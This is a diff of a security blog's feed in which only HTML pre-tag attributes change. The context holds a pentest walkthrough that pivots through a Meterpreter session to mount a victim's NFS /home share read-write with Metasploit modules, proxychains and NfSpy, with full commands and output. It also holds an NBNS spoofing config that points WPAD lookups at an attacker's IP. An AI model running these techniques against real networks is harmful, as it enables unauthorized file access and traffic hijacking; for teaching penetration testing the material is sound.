@@ -20,9 +20,9 @@
 &lt;p&gt;Enter NfSpy: &lt;a href=&#34;https://github.com/bonsaiviking/NfSpy&#34;&gt;https://github.com/bonsaiviking/NfSpy&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;While it&amp;rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
 &lt;p&gt;First we setup up our route so that the aux module will go over the meterpreter session:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The 1 on the end being the meterpreter session number it&amp;rsquo;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
 msf auxiliary(nfsmount) &amp;gt; show options
 
 Module options (auxiliary/scanner/nfs/nfsmount):
@@ -39,7 +39,7 @@ msf auxiliary(nfsmount) &amp;gt; run
 [+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
 [+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/misc/sunrpc_portmapper
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/misc/sunrpc_portmapper
 msf auxiliary(sunrpc_portmapper) &amp;gt; show options
 
 Module options (auxiliary/scanner/misc/sunrpc_portmapper):
@@ -74,7 +74,7 @@ msf auxiliary(sunrpc_portmapper) &amp;gt; run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&amp;rsquo;s socks proxy:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a
 msf auxiliary(socks4a) &amp;gt; show options
 
 Module options (auxiliary/server/socks4a):
@@ -92,7 +92,7 @@ msf auxiliary(socks4a) &amp;gt; run
 [*] Starting the socks4a proxy server
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&amp;rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
 &lt;p&gt;Next up it actually using nfspy (create or prep a directory so you can mount it first):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
 ProxyChains-3.1 (http://proxychains.sf.net)
 FUSE library version: 2.8.6
 nullpath_ok: 0
@@ -110,13 +110,13 @@ max_readahead=0x00020000
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&amp;rsquo;ll just be waiting as there isn&amp;rsquo;t really a time out and Proxychains doesn&amp;rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
 &lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&amp;rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ls /root/nfspy/mount
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls /root/nfspy/mount
 user1
 user2
 user3
 user4
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48
    unique: 166, success, outsize: 32
 unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80
 readdir[0] from 0
@@ -288,7 +288,7 @@ getattr /home/user2
       
       <guid>https://malicious.link/post/2012/2012-09-02-old-school-on-target-nbns-spoofing-part-2/</guid>
       <description>&lt;p&gt;So it turns out that Windows Firewall talks IP addresses just like any other firewall, so if you configure FakeNetBIOSNS to tell everyone that the IP address for whatever they looked up is YOUR IP, guess what, no need to bypass the spoof filters ;-) Happy Rob!&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ cat nbns.ini   
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat nbns.ini   
 PROJECTMENTOR WPAD 172.16.10.207  
 PROJECTMENTOR FILESHARE 173.26.10.207
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201209_nbns_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
